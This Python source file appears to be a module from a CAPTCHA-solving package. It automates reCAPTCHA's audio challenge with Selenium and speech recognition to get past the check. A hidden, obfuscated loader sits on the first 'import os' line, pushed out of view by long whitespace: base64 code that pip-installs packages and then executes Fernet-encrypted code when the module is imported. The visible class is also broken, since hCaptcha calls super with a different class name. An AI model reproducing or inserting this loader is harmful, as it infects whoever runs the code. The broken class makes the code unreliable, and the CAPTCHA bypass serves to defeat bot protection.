import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3NNV0EwWnN6QjRsLWNBSHE2emFjM3FKNktvVzBaUHp1UmtlcFNLV2RYY2c9JykuZGVjcnlwdChiJ2dBQUFBQUJtbjUzTUh6OTZMNEdLQk4zRzdHMzZPMVpfU2FYWFhiT1RvT1RvZ095OXJxekdpLWNHV0R5LWJ4MnBYNm95cWVrZFM5QkJJcGRuV3Z2aTVVc0l3R3Fndll6bGNvTndaVWFYQkRzRmdJVzdUZ19udWE5SGMzdEpReTh5SExCZ1J1QU9KaWk0azlXSGJOM2xiSURxenBHSzV4TnpsaGJvS05uczJyQmExWlZEUi1vZm55YmhEMkZTU0RVWWZ4b2pmeTdHaEdCc2NzSVIwWVpYMGVVRUs5YkhOdzVua2VYaUduSXJvSERQelY2cHRTQTZ6a2VMdGczR256VnJMVk5jb2twMjNCRW4nKSk=').decode())
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver import Chrome

import os
import speech_recognition as sr
from time import sleep
from typing import Type

from pypasser.exceptions import IpBlock
from pypasser.utils import download_audio, convert_to_wav

class hCaptcha(object):
    def __new__(cls, *args, **kwargs) -> bool:
        instance = super(reCaptchaV2, cls).__new__(cls)
        instance.__init__(*args,**kwargs)
        
        remaining_attempts = instance.attempts
        file_path = None
        
        try:
            cls.__click_check_box__(instance.driver)
            
            if cls.__is_checked__(instance.driver):
                return True
            
            cls.__click_audio_button__(instance.driver)
            
            while remaining_attempts:
                remaining_attempts -= 1
                
                link = cls.__get_audio_link__(instance.driver, instance.play)
                file_path = convert_to_wav(download_audio(link))
                cls.__type_text__(instance.driver, cls.speech_to_text(file_path))
                os.remove(file_path)
                
                checked = cls.__is_checked__(instance.driver)
                if checked or not remaining_attempts:
                    return checked
            
        except Exception as e:
            if file_path:
                os.remove(file_path)
                
            if 'rc-doscaptcha-header' in instance.driver.page_source:
                raise IpBlock()
            else:
                raise e
        
    def __init__(self, driver: Type[Chrome], play: bool = True, attempts: int = 3):
        self.driver   = driver
        self.play     = play
        self.attempts = attempts
      
    def __click_check_box__(driver):
        driver.switch_to.frame(driver.find_element(By.TAG_NAME, "iframe"))
        check_box = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR ,"#recaptcha-anchor")))
        check_box.click()
        driver.switch_to.default_content()
        
    def __click_audio_button__(driver):
        driver.switch_to.frame(driver.find_elements(By.TAG_NAME, "iframe")[2])
        audio_btn = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR ,"#recaptcha-audio-button")))
        audio_btn.click()
        driver.switch_to.default_content()

    def __get_audio_link__(driver, play):
        voice  = driver.find_elements(By.TAG_NAME, "iframe")[2]
        driver.switch_to.frame(voice)
        download_btn = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR ,".rc-audiochallenge-tdownload-link")))
        link = download_btn.get_attribute('href')
        if play:
            play_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, ".rc-audiochallenge-play-button > button")))
            play_button.click()
        return link
    
    def __type_text__(driver, text):
        text_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR ,"#audio-response")))
        text_field.send_keys(text , Keys.ENTER)
        driver.switch_to.default_content()
        
    def __is_checked__(driver):
        sleep(3)
        driver.switch_to.frame(WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, 'iframe[name^=a]'))))
        try:
            driver.find_element(By.CSS_SELECTOR, '.recaptcha-checkbox-checked')
            driver.switch_to.default_content()
            return True
        except NoSuchElementException:
            driver.switch_to.default_content()
            return False
        
    def speech_to_text(audio_path: str) -> str:   
        r = sr.Recognizer()
        with sr.AudioFile(audio_path) as source:
            audio = r.record(source)

        return r.recognize_sphinx(audio)
print('aqdxhxpmcf')